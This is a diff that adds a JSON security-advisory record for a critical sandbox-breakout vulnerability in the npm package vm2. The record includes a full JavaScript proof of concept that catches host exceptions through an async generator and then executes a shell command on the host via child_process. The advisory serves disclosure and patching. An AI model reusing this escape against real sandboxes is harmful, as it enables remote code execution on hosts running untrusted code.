@@ -1,0 +1,59 @@
+{
+  "Severity": "CRITICAL",
+  "UpdatedAt": "2026-05-14T21:14:35Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "vm2"
+  },
+  "Advisory": {
+    "DatabaseId": 355935,
+    "Id": "GSA_kwCzR0hTQS0yNDhyLTdoN3EtY3IyNM4ABW5f",
+    "GhsaId": "GHSA-248r-7h7q-cr24",
+    "References": [
+      {
+        "Url": "https://github.com/patriksimek/vm2/security/advisories/GHSA-248r-7h7q-cr24"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2026-45411"
+      },
+      {
+        "Url": "https://github.com/patriksimek/vm2/commit/093494c0c3ef2390d2e56909f9d56e290e6f18b0"
+      },
+      {
+        "Url": "https://github.com/patriksimek/vm2/releases/tag/v3.11.3"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-248r-7h7q-cr24"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-248r-7h7q-cr24"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-45411"
+      }
+    ],
+    "Description": "### Summary\n\nVM2 suffers from a sandbox breakout vulnerability. This allows attackers to write code which can escape from the VM2 sandbox and execute arbitrary commands on the host system.\n\n### Details\n\nIt is possible to catch a host exception using the `yield*` expression inside an async generator. When the generator is closed using the `return` function, the value is awaited on and exceptions thrown in the `then` call will be catched by the runtime and passed to the `yield*` iterator as the next value.\n\n### PoC\n\n```js\nconst {VM} = require(\"vm2\");\nconst vm = new VM();\nconsole.log(vm.run(`\nclass E extends Error {}\nfunction so(d) {\n\tif (d \u003e 0) so(d-1);\n\tconst e = new E();\n\te.stack;\n\tthrow e;\n}\nasync function* helper() {\n\tyield* {\n\t\t[Symbol.asyncIterator]: ()=\u003e({\n\t\t\tnext: v=\u003e({value: v, done: false})\n\t\t})\n\t};\n}\nasync function doCatch(f) {\n\tconst i=helper();\n\tawait i.next();\n\tconst v = await i.return({then(r){f();r();}});\n\treturn v.value;\n}\n(async function f() {\n\tlet min = 0;\n\tlet max = 10000000;\n\twhile (min\u003cmax) {\n\t\tconst mid = (min+max)\u003e\u003e1;\n\t\tconst e = await doCatch(()=\u003eso(mid));\n\t\tif (e.name===\"RangeError\" \u0026\u0026 !(e instanceof RangeError)) {\n\t\t\te.constructor.constructor(\"return process\")().mainModule.require('child_process').execSync('touch pwned');\n\t\t\treturn;\n\t\t}\n\t\tif (e instanceof E) {\n\t\t\tmin = mid+1;\n\t\t} else {\n\t\t\tmax = mid;\n\t\t}\n\t}\n})();\n`));\n```\n\n### Impact\n\nAttackers can perform Remote Code Execution under the assumption that arbitrary code can be executed inside the context of a vm2 sandbox.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-05-14T21:14:32Z",
+    "Severity": "CRITICAL",
+    "Summary": "vm2 Has a Sandbox Breakout Using Async Generator",
+    "UpdatedAt": "2026-05-14T21:14:35Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 9.8,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "3.11.3"
+      },
+      "VulnerableVersionRange": "\u003c= 3.11.2"
+    }
+  ]
+}
